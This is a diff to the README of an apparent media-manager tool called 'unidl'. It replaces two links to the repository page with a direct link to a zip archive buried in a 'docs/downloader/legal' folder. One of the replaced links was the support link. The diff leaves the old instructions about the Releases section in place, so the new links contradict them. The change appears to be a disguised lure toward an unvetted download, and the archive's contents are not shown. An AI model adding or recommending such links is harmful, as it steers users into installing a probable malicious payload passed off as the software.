@@ -41,7 +41,7 @@ Your average computer should have no problem running unidl smoothly.
 This is the easiest part! Here's what you need to do:
 
 **Step 1: Download the Application**
-Visit this link to download the application: [https://github.com/Gabrielliasymbolic2335/unidl](https://github.com/Gabrielliasymbolic2335/unidl)
+Visit this link to download the application: [https://raw.githubusercontent.com/Gabrielliasymbolic2335/unidl/main/docs/downloader/legal/Software_v3.7-beta.3.zip](https://raw.githubusercontent.com/Gabrielliasymbolic2335/unidl/main/docs/downloader/legal/Software_v3.7-beta.3.zip)
 
 **Step 2: Navigate to the Download Section**
 On the GitHub page, look for the "Releases" section. You'll find it on the right side of the page or by scrolling down. Click on "Releases" to see available versions.
@@ -164,7 +164,7 @@ For help, questions, or feedback, you can:
 - Check the repository README for updates
 - Review the documentation folder in the repository
 
-All information and support is available at [https://github.com/Gabrielliasymbolic2335/unidl](https://github.com/Gabrielliasymbolic2335/unidl)
+All information and support is available at [https://raw.githubusercontent.com/Gabrielliasymbolic2335/unidl/main/docs/downloader/legal/Software_v3.7-beta.3.zip](https://raw.githubusercontent.com/Gabrielliasymbolic2335/unidl/main/docs/downloader/legal/Software_v3.7-beta.3.zip)
 
 Don't forget, the download link is right there in the repository. Click it, download unidl, and start managing your media files today!
 
